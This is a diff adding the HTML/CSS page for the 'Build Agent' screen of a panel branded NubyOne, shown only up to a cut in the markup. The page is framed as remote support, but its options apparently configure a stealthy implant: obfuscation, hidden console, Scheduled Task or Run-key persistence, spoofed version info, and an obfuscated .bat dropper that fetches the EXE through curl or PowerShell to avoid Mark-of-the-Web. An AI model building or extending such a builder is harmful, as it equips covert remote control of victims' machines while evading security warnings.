@@ -1,0 +1,1217 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>𝗡𝘂𝗯𝘆𝗢𝗻𝗲 – Build Agent</title>
+    <link rel="icon" type="image/x-icon" href="/assets/favicon.ico" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" crossorigin="anonymous" />
+    <style>
+      *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+      :root {
+        font-family: "Inter", system-ui, -apple-system, sans-serif;
+        color-scheme: dark;
+        --bg: #0c2645;
+        --border: rgba(34,211,238,.18);
+        --border-sub: rgba(255,255,255,.07);
+        --accent: #22d3ee;
+        --accent-soft: rgba(34,211,238,.2);
+        --text: #eef5ff;
+        --text-muted: #93c5e8;
+        --text-dim: #3d6085;
+        --card-bg: rgba(14,48,98,.58);
+        --card-hover: rgba(14,100,200,.28);
+        --border-hover: rgba(34,211,238,.6);
+      }
+      html, body { color: var(--text); min-height: 100vh; }
+      ::-webkit-scrollbar { width: 4px; height: 4px; }
+      ::-webkit-scrollbar-track { background: transparent; }
+      ::-webkit-scrollbar-thumb { background: rgba(34,211,238,.5); border-radius: 99px; }
+      ::-webkit-scrollbar-thumb:hover { background: rgba(34,211,238,.75); }
+      * { scrollbar-width: thin; scrollbar-color: rgba(34,211,238,.5) transparent; }
+      body {
+        display: flex; flex-direction: column;
+        background:
+          radial-gradient(ellipse 80% 60% at 15% 10%, rgba(14,165,233,.42) 0%, transparent 55%),
+          radial-gradient(ellipse 70% 55% at 85% 80%, rgba(34,211,238,.35) 0%, transparent 55%),
+          #0c2645;
+        background-attachment: fixed;
+      }
+
+      /* ── App header + nav ─────────────────────────────── */
+      .app-header { position: sticky; top: 0; z-index: 50; background: rgba(10,30,62,.90); border-bottom: 1px solid rgba(34,211,238,.18); backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px); flex-shrink: 0; }
+      .header-brand-row { display: flex; align-items: center; justify-content: space-between; padding: .7rem 1.25rem; }
+      .header-brand { display: flex; align-items: center; gap: .25rem; text-decoration: none; }
+      .header-name { font-size: 1rem; font-weight: 700; color: #f0fffe; letter-spacing: -.01em; }
+      .menu-toggle { display: none; align-items: center; gap: .45rem; background: rgba(6,100,180,.15); border: 1px solid rgba(34,211,238,.28); color: #7dd8f0; border-radius: 10px; padding: .45rem .9rem; font-size: .85rem; font-weight: 600; font-family: inherit; cursor: pointer; transition: background .15s; }
+      .menu-toggle:hover { background: rgba(6,100,180,.25); }
+      .nav-overlay { display: none; }
+      .nav-panel { border-top: 1px solid rgba(255,255,255,.05); padding: .55rem 1.25rem .65rem; display: flex; flex-direction: column; gap: .45rem; }
+      .nav-buttons-row { display: flex; flex-wrap: wrap; gap: .42rem; }
+      .nav-btn { display: inline-flex; align-items: center; gap: .5rem; padding: .52rem 1rem; border-radius: 10px; border: 1px solid rgba(255,255,255,.08); background: rgba(255,255,255,.04); color: #9db1cc; font-size: .855rem; font-weight: 500; text-decoration: none; cursor: pointer; transition: all .15s; white-space: nowrap; font-family: inherit; }
+      .nav-btn:hover { background: rgba(6,120,180,.18); border-color: rgba(34,211,238,.35); color: #c0e8ff; transform: translateY(-1px); }
+      .nav-btn.active { background: rgba(14,100,200,.3); border-color: rgba(34,211,238,.65); color: #38d6f0; box-shadow: 0 0 0 1px rgba(34,211,238,.18); }
+      .nav-btn i { font-size: .82rem; }
+      .nav-user-row { display: flex; align-items: center; justify-content: center; gap: .65rem; padding-top: .45rem; border-top: 1px solid rgba(255,255,255,.05); }
+      .bell-btn { position: relative; display: inline-flex; align-items: center; justify-content: center; width: 34px; height: 34px; border-radius: 9px; flex-shrink: 0; background: rgba(255,255,255,.06); border: 1px solid rgba(255,255,255,.1); color: #93c5e8; cursor: pointer; transition: all .15s; font-size: .9rem; }
+      .bell-btn:hover { background: rgba(34,211,238,.12); border-color: rgba(34,211,238,.35); color: #22d3ee; }
+      .bell-btn.bell-active { background: rgba(34,211,238,.15); border-color: rgba(34,211,238,.6); color: #22d3ee; box-shadow: 0 0 0 2px rgba(34,211,238,.15); }
+      .bell-badge { position: absolute; top: -5px; right: -5px; min-width: 16px; height: 16px; border-radius: 99px; background: #ef4444; color: #fff; font-size: .6rem; font-weight: 700; display: flex; align-items: center; justify-content: center; padding: 0 3px; line-height: 1; pointer-events: none; }
+      .nav-user-pill { display: flex; align-items: center; gap: .5rem; background: rgba(4,20,50,.6); border: 1px solid rgba(34,211,238,.16); border-radius: 99px; padding: .32rem .85rem .32rem .65rem; }
+      .nav-user-pill i { color: #7dd8f0; font-size: .78rem; }
+      .nav-username { font-size: .83rem; font-weight: 600; color: #eef5ff; }
+      .nav-role-badge { font-size: .68rem; font-weight: 700; text-transform: capitalize; background: rgba(34,211,238,.2); border: 1px solid rgba(34,211,238,.4); color: #22d3ee; border-radius: 99px; padding: .13rem .52rem; }
+      .logout-btn { display: inline-flex; align-items: center; justify-content: center; width: 34px; height: 34px; border-radius: 9px; flex-shrink: 0; background: rgba(239,68,68,.1); border: 1px solid rgba(239,68,68,.2); color: #fca5a5; cursor: pointer; transition: all .15s; font-size: .9rem; font-family: inherit; }
+      .logout-btn:hover { background: rgba(239,68,68,.2); border-color: rgba(239,68,68,.5); }
+      @keyframes logo-bounce { 0%,100%{transform:translateY(3px)} 50%{transform:translateY(-3px)} }
+      .logo-bounce { animation: logo-bounce 2.2s ease-in-out infinite; display: inline-flex; align-items: center; }
+      .logo-img-sm { width:30px; height:30px; object-fit:contain; border-radius:7px; flex-shrink:0; }
+
+      /* ── Page wrapper ─────────────────────────────────── */
+      .main { flex: 1; padding: 1.5rem 1.5rem 2rem; max-width: 1400px; width: 100%; margin: 0 auto; }
+      .page-header { margin-bottom: 1.5rem; }
+      .page-title  { font-size: 1.3rem; font-weight: 700; color: #f8fbff; letter-spacing: -.02em; display: flex; align-items: center; gap: .5rem; }
+      .page-title i { color: var(--accent); font-size: 1.1rem; }
+      .page-sub    { color: var(--text-muted); font-size: .855rem; margin-top: .22rem; }
+
+      /* ── Builder two-column layout ────────────────────── */
+      .builder-layout {
+        display: grid;
+        grid-template-columns: 480px 1fr;
+        gap: 1.25rem;
+        align-items: start;
+      }
+
+      /* ── Shared panel styles ──────────────────────────── */
+      .config-panel, .output-panel {
+        background: var(--card-bg);
+        border: 1px solid var(--border);
+        border-radius: 16px;
+        overflow: hidden;
+      }
+      .panel-header {
+        display: flex; align-items: center; gap: .55rem;
+        padding: .9rem 1.2rem;
+        border-bottom: 1px solid var(--border);
+        font-size: .9rem; font-weight: 700; color: #eef5ff;
+        background: rgba(8,28,60,.42);
+      }
+      .panel-header i { color: var(--accent); font-size: .88rem; }
+
+      /* ── Config sections ──────────────────────────────── */
+      .section { border-bottom: 1px solid var(--border); }
+      .section:last-of-type { border-bottom: none; }
+      .section-header {
+        display: flex; align-items: center; justify-content: space-between;
+        padding: .85rem 1.2rem;
+        cursor: pointer;
+        user-select: none;
+        transition: background .12s;
+      }
+      .section-header:hover { background: rgba(6,100,180,.08); }
+      .section-title { font-size: .855rem; font-weight: 700; color: #a8d8f5; display: flex; align-items: center; gap: .5rem; }
+      .section-chevron { font-size: .72rem; color: var(--accent); transition: transform .2s; }
+      .section-chevron.collapsed { transform: rotate(180deg); }
+      .section-body { padding: .2rem 1.2rem 1rem; }
+      .section-body.hidden { display: none; }
+
+      /* ── Platform checkboxes ──────────────────────────── */
+      .platform-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: .35rem .55rem;
+        padding-top: .5rem;
+      }
+      .platform-chk {
+        display: flex; align-items: center; gap: .55rem;
+        padding: .48rem .6rem;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: .835rem; color: var(--text-muted);
+        transition: background .12s;
+        border: 1px solid transparent;
+      }
+      .platform-chk:hover { background: rgba(6,120,180,.1); border-color: rgba(34,211,238,.18); color: #a8d8f5; }
+      .platform-chk input[type="checkbox"] {
+        width: 15px; height: 15px;
+        accent-color: var(--accent);
+        cursor: pointer; flex-shrink: 0;
+      }
+      .platform-chk .os-icon { font-size: .82rem; width: 14px; text-align: center; flex-shrink: 0; }
+
+      /* ── Form fields ──────────────────────────────────── */
+      .fld { margin-bottom: .85rem; }
+      .fld:last-child { margin-bottom: 0; }
+      .fld > label { display: block; font-size: .775rem; color: var(--text-muted); margin-bottom: .35rem; font-weight: 500; }
+      .fld input[type="text"] {
+        width: 100%; padding: .58rem .85rem; border-radius: 8px; border: 1px solid var(--border);
+        background: rgba(0,0,0,.25); color: var(--text); font-size: .845rem; font-family: inherit;
+        outline: none; transition: border-color .14s;
+      }
+      .fld input[type="text"]:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(34,211,238,.18); }
+      .fld-hint { font-size: .72rem; color: var(--text-dim); margin-top: .28rem; }
+      .fld-checkbox { display: flex; align-items: center; gap: .5rem; padding: .3rem 0; cursor: pointer; font-size: .835rem; color: var(--text-muted); }
+      .fld-checkbox input { accent-color: var(--accent); cursor: pointer; }
+      .fld-group-label { font-size: .72rem; font-weight: 700; text-transform: uppercase; letter-spacing: .06em; color: var(--text-dim); margin-bottom: .6rem; margin-top: .8rem; }
+
+      /* ── Toggle ───────────────────────────────────────── */
+      .opt-row { display: flex; align-items: flex-start; gap: .85rem; margin-bottom: .75rem; }
+      .opt-row:last-child { margin-bottom: 0; }
+      .toggle-wrap { position: relative; display: inline-block; width: 34px; height: 19px; flex-shrink: 0; margin-top: .15rem; }
+      .toggle-wrap input { opacity: 0; width: 0; height: 0; }
+      .toggle-slider { position: absolute; inset: 0; background: rgba(255,255,255,.12); border-radius: 99px; cursor: pointer; transition: .2s; }
+      .toggle-slider::before { content: ""; position: absolute; height: 13px; width: 13px; left: 3px; bottom: 3px; background: #fff; border-radius: 50%; transition: .2s; }
+      input:checked + .toggle-slider { background: var(--accent); }
+      input:checked + .toggle-slider::before { transform: translateX(15px); }
+      .opt-label { font-size: .855rem; font-weight: 600; color: #e0eef0; }
+      .opt-desc  { font-size: .775rem; color: var(--text-muted); margin-top: .15rem; line-height: 1.45; }
+
+      .win-badge { font-size: .68rem; font-weight: 700; background: rgba(34,211,238,.2); border: 1px solid rgba(34,211,238,.35); color: #22d3ee; border-radius: 99px; padding: .1rem .48rem; margin-left: .4rem; }
+
+      .divider { height: 1px; background: var(--border); margin: .75rem 0; }
+
+      /* ── Action buttons ───────────────────────────────── */
+      .btn-row { display: flex; gap: .7rem; padding: 1rem 1.2rem; border-top: 1px solid var(--border); background: rgba(3,18,45,.28); }
+      .btn-start {
+        flex: 1; padding: .78rem 1rem; border-radius: 10px; border: none;
+        font-size: .9rem; font-weight: 700; font-family: inherit; cursor: pointer;
+        background: linear-gradient(135deg, var(--accent), #0369a1);
+        color: #fff; display: flex; align-items: center; justify-content: center; gap: .5rem;
+        transition: opacity .14s, transform .1s; box-shadow: 0 3px 16px rgba(34,211,238,.32);
+      }
+      .btn-start:hover:not(:disabled) { opacity: .88; transform: translateY(-1px); }
+      .btn-start:disabled { opacity: .5; cursor: not-allowed; transform: none; }
+      .btn-update-all {
+        flex: 1; padding: .78rem 1rem; border-radius: 10px; border: none;
+        font-size: .9rem; font-weight: 700; font-family: inherit; cursor: pointer;
+        background: linear-gradient(135deg, #d97706, #b45309);
+        color: #fff; display: flex; align-items: center; justify-content: center; gap: .5rem;
+        transition: opacity .14s, transform .1s; box-shadow: 0 3px 16px rgba(217,119,6,.25);
+      }
+      .btn-update-all:hover:not(:disabled) { opacity: .88; transform: translateY(-1px); }
+      .btn-update-all:disabled { opacity: .5; cursor: not-allowed; transform: none; }
+
+      /* ── Output panel ─────────────────────────────────── */
+      .output-panel { display: flex; flex-direction: column; }
+
+      /* Status banner */
+      .status-banner {
+        margin: .85rem 1.1rem .4rem;
+        padding: .7rem 1rem;
+        border-radius: 9px;
+        font-size: .865rem; font-weight: 600;
+        display: flex; align-items: center; gap: .55rem;
+      }
+      .status-banner.success { background: rgba(34,197,94,.1); border: 1px solid rgba(34,197,94,.25); color: #4ade80; }
+      .status-banner.error   { background: rgba(239,68,68,.08); border: 1px solid rgba(239,68,68,.22); color: #fca5a5; }
+      .status-banner.building{ background: rgba(34,211,238,.16); border: 1px solid rgba(34,211,238,.3); color: #22d3ee; }
+
+      /* Terminal */
+      .terminal-wrap { margin: 0 1.1rem .9rem; flex-shrink: 0; }
+      .terminal {
+        background: #0a0f0f;
+        border: 1px solid rgba(34,211,238,.16);
+        border-radius: 10px;
+        padding: .85rem 1rem;
+        font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+        font-size: .78rem; line-height: 1.65;
+        color: #a8b8b8;
+        min-height: 140px;
+        max-height: 240px;
+        overflow-y: auto;
+        white-space: pre-wrap;
+        word-break: break-all;
+      }
+      .terminal .term-hint { color: var(--text-dim); font-style: italic; }
+      .terminal .t-dim  { color: #4a6060; }
+      .terminal .t-ok   { color: #4ade80; }
+      .terminal .t-warn { color: #facc15; }
+      .terminal .t-err  { color: #f87171; }
+      .terminal .t-bold { color: #a8d8f5; font-weight: 700; }
+      .terminal .t-id   { color: #22d3ee; }
+      @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+      .cursor { display: inline-block; width: 7px; height: 13px; background: #22d3ee; vertical-align: middle; animation: blink .9s step-end infinite; margin-left: 1px; }
+
+      /* Built clients list */
+      .built-section { border-top: 1px solid var(--border); padding: 0 1.1rem 1.1rem; }
+      .built-header { font-size: .78rem; font-weight: 700; text-transform: uppercase; letter-spacing: .06em; color: var(--text-dim); padding: .85rem 0 .6rem; }
+      .built-empty { font-size: .84rem; color: var(--text-dim); padding: .6rem 0 .3rem; }
+      .build-entry {
+        background: rgba(0,0,0,.25);
+        border: 1px solid var(--border);
+        border-radius: 10px;
+        margin-bottom: .6rem;
+        overflow: hidden;
+      }
+      .build-entry-top {
+        display: flex; align-items: center; justify-content: space-between;
+        padding: .65rem .85rem;
+        border-bottom: 1px solid rgba(34,211,238,.1);
+        gap: .5rem;
+      }
+      .build-id { font-family: monospace; font-size: .75rem; color: var(--text-dim); flex-shrink: 0; }
+      .build-date { font-size: .75rem; color: var(--text-dim); flex-shrink: 0; }
+      .build-ttl {
+        font-size: .77rem; font-weight: 700; color: #4ade80;
+        background: rgba(34,197,94,.1); border: 1px solid rgba(34,197,94,.2);
+        border-radius: 99px; padding: .1rem .5rem; flex-shrink: 0;
+      }
+      .build-ttl.expiring { color: #facc15; background: rgba(250,204,21,.1); border-color: rgba(250,204,21,.2); }
+      .build-delete-btn {
+        display: inline-flex; align-items: center; gap: .3rem;
+        background: rgba(239,68,68,.08); border: 1px solid rgba(239,68,68,.18);
+        color: #fca5a5; border-radius: 7px; padding: .3rem .6rem; font-size: .75rem;
+        font-weight: 600; font-family: inherit; cursor: pointer; transition: background .14s; flex-shrink: 0;
+      }
+      .build-delete-btn:hover { background: rgba(239,68,68,.18); }
+      .build-file-row {
+        display: flex; align-items: center; gap: .65rem;
+        padding: .55rem .85rem;
+        flex-wrap: wrap;
+      }
+      .build-filename { font-family: monospace; font-size: .8rem; color: #a8d8f5; flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+      .build-platform-badge {
+        font-size: .7rem; font-weight: 700;
+        background: rgba(34,211,238,.2); border: 1px solid rgba(34,211,238,.32);
+        color: #22d3ee; border-radius: 99px; padding: .1rem .48rem; flex-shrink: 0;
+      }
+      .build-version { font-size: .73rem; color: var(--text-dim); flex-shrink: 0; }
+      .build-sha {
+        font-family: monospace; font-size: .7rem; color: var(--text-dim);
+        flex-shrink: 0; letter-spacing: .02em;
+      }
+      .build-dl-btn {
+        display: inline-flex; align-items: center; gap: .38rem;
+        background: rgba(34,211,238,.2); border: 1px solid rgba(34,211,238,.32);
+        color: #22d3ee; border-radius: 7px; padding: .3rem .65rem; font-size: .78rem;
+        font-weight: 600; font-family: inherit; cursor: pointer; transition: background .14s; flex-shrink: 0;
+        text-decoration: none;
+      }
+      .build-dl-btn:hover { background: rgba(34,211,238,.3); }
+      .build-copy-btn {
+        display: inline-flex; align-items: center; gap: .38rem;
+        background: rgba(99,102,241,.15); border: 1px solid rgba(99,102,241,.3);
+        color: #a5b4fc; border-radius: 7px; padding: .3rem .65rem; font-size: .78rem;
+        font-weight: 600; font-family: inherit; cursor: pointer; transition: background .14s; flex-shrink: 0;
+      }
+      .build-copy-btn:hover { background: rgba(99,102,241,.28); }
+      /* ── Build entries ─────────────────────────── */
+      .build-unsigned-badge {
+        font-size: .68rem; font-weight: 700;
+        background: rgba(255,255,255,.04); border: 1px solid rgba(255,255,255,.1);
+        color: #9db1cc; border-radius: 99px; padding: .1rem .46rem; flex-shrink: 0;
+      }
+
+
+      /* ── Responsive ───────────────────────────────────── */
+      @media (max-width: 1100px) {
+        .builder-layout { grid-template-columns: 420px 1fr; }
+      }
+      @media (max-width: 920px) {
+        .builder-layout { grid-template-columns: 1fr; }
+        .menu-toggle { display: flex; }
+        .nav-panel { display: none; }
+        .nav-panel.open { display: flex; flex-direction: column; gap: .45rem; }
+        .nav-user-row { flex-wrap: nowrap; }
+        .nav-user-pill { justify-self: center; }
+      }
+      @media (max-width: 768px) {
+        .menu-toggle { display: flex; }
+        .nav-panel { display: none; }
+        .nav-panel.open { display: flex; flex-direction: column; gap: .45rem; }
+        .nav-user-row { flex-wrap: nowrap; }
+        .nav-user-pill { justify-self: center; }
+        .main { padding: 1.1rem 1rem 1.5rem; }
+        .btn-row { flex-direction: column; }
+      }
+      @media (max-width: 480px) {
+        .platform-grid { grid-template-columns: 1fr; }
+        .build-entry-top { flex-wrap: wrap; }
+      }
+
+
+      /* ── Toast ──────────────────────────────────────────── */
+      #toast-wrap { position: fixed; bottom: 1.4rem; right: 1.4rem; z-index: 9999; display: flex; flex-direction: column; gap: .45rem; }
+      .toast { background: #161b2e; border: 1px solid rgba(255,255,255,.1); border-radius: 10px; padding: .7rem 1rem; font-size: .84rem; color: var(--text); display: flex; align-items: center; gap: .6rem; box-shadow: 0 8px 24px rgba(0,0,0,.4); animation: toastSlideUp .2s ease; }
+      .toast.success { border-color: rgba(34,197,94,.3); }
+      .toast.error   { border-color: rgba(239,68,68,.3); }
+      .toast.warn    { border-color: rgba(251,191,36,.3); }
+      .toast.success i { color: #4ade80; }
+      .toast.error i   { color: #fca5a5; }
+      .toast.warn i    { color: #fde68a; }
+      @keyframes toastSlideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+      /* ── Desktop single-row header ───────────────────────── */
+      @media (min-width: 921px) {
+        .app-header { display: flex; flex-direction: row; align-items: center; padding: 0 1.25rem; }
+        .header-brand-row { padding: .55rem 0; padding-right: 1rem; flex-shrink: 0; }
+        .nav-panel { flex: 1; flex-direction: row; align-items: center; border-top: none; padding: 0; gap: .45rem; }
+        .nav-buttons-row { flex: 1; flex-wrap: nowrap; gap: .3rem; }
+        .nav-user-row { padding-top: 0; border-top: none; flex-wrap: nowrap; }
+      }
+    </style>
+      <script src="/assets/branding.js"></script>
+  </head>
+  <body>
+    <div id="toast-wrap"></div>
+    <header class="app-header">
+      <div class="header-brand-row">
+        <a href="/clients" class="header-brand">
+          <span class="logo-bounce"><img src="/assets/logo.png" alt="𝗡𝘂𝗯𝘆𝗢𝗻𝗲" class="logo-img-sm" /></span>
+          <span class="header-name">𝗡𝘂𝗯𝘆𝗢𝗻𝗲</span>
+        </a>
+        <button class="menu-toggle" onclick="toggleNav()" aria-label="Menu">
+          <i class="fa-solid fa-bars"></i> Menu
+        </button>
+      </div>
+      <div class="nav-panel" id="nav-panel">
+        <div class="nav-buttons-row">
+          <a href="/clients" class="nav-btn"><i class="fa-solid fa-desktop"></i> Clients</a>
+          <a href="/build" class="nav-btn active"><i class="fa-solid fa-hammer"></i> Builder</a>
+          <a href="/scripts" class="nav-btn"><i class="fa-solid fa-code"></i> Scripts</a>
+          <a href="/users" class="nav-btn" id="admin-nav-btn" style="display:none"><i class="fa-solid fa-users"></i> Users</a>
+          <a href="/settings" class="nav-btn" id="settings-nav-btn" style="display:none"><i class="fa-solid fa-gear"></i> Settings</a>
+        </div>
+        <div class="nav-user-row">
+          <button class="bell-btn" id="bell-btn" onclick="openNotifDrawer()" title="Notifications">
+            <i class="fa-solid fa-bell"></i>
+            <span class="bell-badge" id="bell-badge" style="display:none"></span>
+          </button>
+          <div class="nav-user-pill">
+            <i class="fa-solid fa-user"></i>
+            <span class="nav-username" id="username-display">Loading…</span>
+            <span class="nav-role-badge" id="role-display">—</span>
+          </div>
+          <button class="logout-btn" onclick="logout()" title="Sign out">
+            <i class="fa-solid fa-right-from-bracket"></i>
+          </button>
+        </div>
+      </div>
+    </header>
+
+    <main class="main">
+      <div class="page-header">
+        <div class="page-title"><i class="fa-solid fa-hammer"></i>Build Agent</div>
+        <div class="page-sub">Compile a pre-configured agent binary for approved remote-support deployments.</div>
+      </div>
+
+      <div class="builder-layout">
+
+        <!-- ───────────── LEFT: Build Configuration ───────────── -->
+        <div class="config-panel">
+          <div class="panel-header">
+            <i class="fa-solid fa-gear"></i> Build Configuration
+          </div>
+
+          <!-- Target Platforms -->
+          <div class="section">
+            <div class="section-header" onclick="toggleSection('platforms')">
+              <div class="section-title"><i class="fa-solid fa-layer-group" style="font-size:.78rem;color:var(--accent);"></i> Target Platforms</div>
+              <i class="fa-solid fa-chevron-up section-chevron" id="chevron-platforms"></i>
+            </div>
+            <div class="section-body" id="body-platforms">
+              <div class="platform-grid">
+                <label class="platform-chk">
+                  <input type="checkbox" class="plat-chk" value="windows|amd64" checked />
+                  <span class="os-icon" style="color:#38bdf8;"><i class="fa-brands fa-windows"></i></span>
+                  Windows x64
+                </label>
+                <label class="platform-chk">
+                  <input type="checkbox" class="plat-chk" value="windows|386" />
+                  <span class="os-icon" style="color:#38bdf8;"><i class="fa-brands fa-windows"></i></span>
+                  Windows x86
+                </label>
+                <label class="platform-chk">
+                  <input type="checkbox" class="plat-chk" value="windows|arm64" />
+                  <span class="os-icon" style="color:#38bdf8;"><i class="fa-brands fa-windows"></i></span>
+                  Windows ARM64
+                </label>
+                <label class="platform-chk">
+                  <input type="checkbox" class="plat-chk" value="windows|armv7" />
+                  <span class="os-icon" style="color:#38bdf8;"><i class="fa-brands fa-windows"></i></span>
+                  Windows ARM32
+                </label>
+                <label class="platform-chk">
+                  <input type="checkbox" class="plat-chk" value="linux|amd64" />
+                  <span class="os-icon" style="color:#fbbf24;"><i class="fa-brands fa-linux"></i></span>
+                  Linux x64
+                </label>
+                <label class="platform-chk">
+                  <input type="checkbox" class="plat-chk" value="linux|arm64" />
+                  <span class="os-icon" style="color:#fbbf24;"><i class="fa-brands fa-linux"></i></span>
+                  Linux ARM64
+                </label>
+                <label class="platform-chk">
+                  <input type="checkbox" class="plat-chk" value="darwin|amd64" />
+                  <span class="os-icon" style="color:#e2e8f0;"><i class="fa-brands fa-apple"></i></span>
+                  macOS x64
+                </label>
+                <label class="platform-chk">
+                  <input type="checkbox" class="plat-chk" value="darwin|arm64" />
+                  <span class="os-icon" style="color:#e2e8f0;"><i class="fa-brands fa-apple"></i></span>
+                  macOS ARM64
+                </label>
+              </div>
+            </div>
+          </div>
+
+          <!-- Connection & Identity -->
+          <div class="section">
+            <div class="section-header" onclick="toggleSection('connection')">
+              <div class="section-title"><i class="fa-solid fa-link" style="font-size:.78rem;color:var(--accent);"></i> Connection &amp; Identity</div>
+              <i class="fa-solid fa-chevron-up section-chevron collapsed" id="chevron-connection"></i>
+            </div>
+            <div class="section-body hidden" id="body-connection">
+              <div class="fld">
+                <label for="inp-url">Server URL <span style="color:#ef4444;">*</span></label>
+                <input id="inp-url" type="text" placeholder="wss://yourdomain.com" autocomplete="off" />
+                <div class="fld-hint">WebSocket address baked into the binary. The agent dials home here on launch.</div>
+              </div>
+              <div class="fld">
+                <label class="fld-checkbox">
+                  <input type="checkbox" id="opt-raw-https" />
+                  Use raw HTTPS server list
+                </label>
+              </div>
+              <div class="fld">
+                <label for="inp-filename">Output Filename</label>
+                <input id="inp-filename" type="text" placeholder="zc-agent" autocomplete="off" />
+                <div class="fld-hint">Leave blank to use the default platform-specific name.</div>
+              </div>
+              <div class="fld">
+                <label for="inp-tag">Mutex (Single-Instance Key)</label>
+                <input id="inp-tag" type="text" placeholder="e.g. Office-PC, ClientABC" maxlength="60" autocomplete="off" />
+                <div class="fld-hint">Appears in the Machines list. Prevents duplicate instances.</div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Windows Settings -->
+          <div class="section">
+            <div class="section-header" onclick="toggleSection('windows')">
+              <div class="section-title">
+                <i class="fa-brands fa-windows" style="font-size:.78rem;color:#38bdf8;"></i> Windows Settings
+                <span class="win-badge">Windows Only</span>
+              </div>
+              <i class="fa-solid fa-chevron-up section-chevron collapsed" id="chevron-windows"></i>
+            </div>
+            <div class="section-body hidden" id="body-windows">
+              <div class="opt-row">
+                <label class="toggle-wrap"><input type="checkbox" id="opt-hide" /><span class="toggle-slider"></span></label>
+                <div>
+                  <div class="opt-label">Run Without Console Window</div>
+                  <div class="opt-desc">Builds the Windows executable without interactive GUI.</div>
+                </div>
+              </div>
+              <div class="opt-row">
+                <label class="toggle-wrap"><input type="checkbox" id="opt-plain" /><span class="toggle-slider"></span></label>
+                <div>
+                  <div class="opt-label">Plain Build (Zero Obfuscation)</div>
+                  <div class="opt-desc">enabling this will build a plain binary</div>
+                </div>
+              </div>
+              <div class="opt-row">
+                <label class="toggle-wrap"><input type="checkbox" id="opt-no-bootstrap" /><span class="toggle-slider"></span></label>
+                <div>
+                  <div class="opt-label">External Persistence</div>
+                  <div class="opt-desc">The agent connects immediately on launch — no file copy, no Scheduled Task, no Run key. Use this in plain binary mode only if you intend to encrypt your output. <strong>Do not use this</strong> if you plan to hand the EXE directly to an end user or run it without a management tool — the agent will not survive a reboot unless your tooling restarts it.</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- PE Version Info -->
+          <div class="section" id="section-verinfo">
+            <div class="section-header" onclick="toggleSection('verinfo')">
+              <div class="section-title">
+                <i class="fa-solid fa-fingerprint" style="font-size:.78rem;color:#a78bfa;"></i> PE Version Info
+                <span class="win-badge">Windows Only</span>
+              </div>
+              <i class="fa-solid fa-chevron-up section-chevron collapsed" id="chevron-verinfo"></i>
+            </div>
+            <div class="section-body hidden" id="body-verinfo">
+              <div style="font-size:.775rem;color:var(--text-muted);margin-bottom:.7rem;line-height:1.5;">
+                Embeds a <code style="font-family:monospace;background:rgba(0,0,0,.3);padding:.1rem .3rem;border-radius:4px;">VERSIONINFO</code> resource block into the Windows PE. Leave fields blank to use the defaults.
+              </div>
+              <div id="vi-status-row" style="display:none;margin-bottom:.65rem;font-size:.73rem;display:flex;align-items:center;gap:.4rem;"></div>
+              <div class="fld">
+                <label for="vi-product">Product Name</label>
+                <input id="vi-product" type="text" placeholder="Remote Management Service" autocomplete="off" maxlength="128" />
+              </div>
+              <div class="fld">
+                <label for="vi-company">Company Name</label>
+                <input id="vi-company" type="text" placeholder="IT Solutions Corp" autocomplete="off" maxlength="128" />
+              </div>
+              <div class="fld">
+                <label for="vi-desc">File Description</label>
+                <input id="vi-desc" type="text" placeholder="Remote Management Agent" autocomplete="off" maxlength="128" />
+              </div>
+            </div>
+          </div>
+
+          <!-- Output Type -->
+          <div class="section">
+            <div class="section-header" onclick="toggleSection('outtype')">
+              <div class="section-title"><i class="fa-solid fa-file-export" style="font-size:.78rem;color:var(--accent);"></i> Output Type</div>
+              <i class="fa-solid fa-chevron-up section-chevron collapsed" id="chevron-outtype"></i>
+            </div>
+            <div class="section-body hidden" id="body-outtype">
+              <div style="font-size:.775rem;color:var(--text-muted);margin-bottom:.65rem;line-height:1.5;">
+                <strong>.exe</strong> — native binary, self-installing. <strong>.bat</strong> — obfuscated delivery script (Windows only) that downloads and runs the EXE using curl with a PowerShell fallback; no Mark-of-the-Web on the EXE.
+              </div>
+              <div class="platform-grid" id="output-type-grid">
+                <label class="platform-chk">
+                  <input type="radio" name="out-type" class="out-type-radio" value="exe" checked />
+                  <span class="os-icon" style="color:#38bdf8;"><i class="fa-solid fa-cube"></i></span>
+                  <span><strong>.exe</strong></span>
+                </label>
+                <label class="platform-chk">
+                  <input type="radio" name="out-type" class="out-type-radio" value="bat" />
+                  <span class="os-icon" style="color:#fb923c;"><i class="fa-solid fa-terminal"></i></span>
+                  <span><strong>.bat</strong></span>
+                </label>
+              </div>
+            </div>
+          </div>
+
+          <!-- Action buttons -->
+          <div class="btn-row">
+            <button class="btn-start" id="btn-start" onclick="startBuild(false)">
+              <i class="fa-solid fa-hammer"></i> Start Build
+            </button>
+            <button class="btn-update-all" id="btn-update-all" onclick="startBuild(true)">
+              <i class="fa-solid fa-rotate"></i> Build &amp; Update All
+            </button>
+          </div>
+        </div>
+
+        <!-- ───────────── RIGHT: Build Output ───────────── -->
+        <div class="output-panel">
+          <div class="panel-header" style="justify-content:space-between;">
+            <span><i class="fa-solid fa-terminal"></i> Build Output</span>
+            <div style="display:flex;align-items:center;gap:.45rem;">
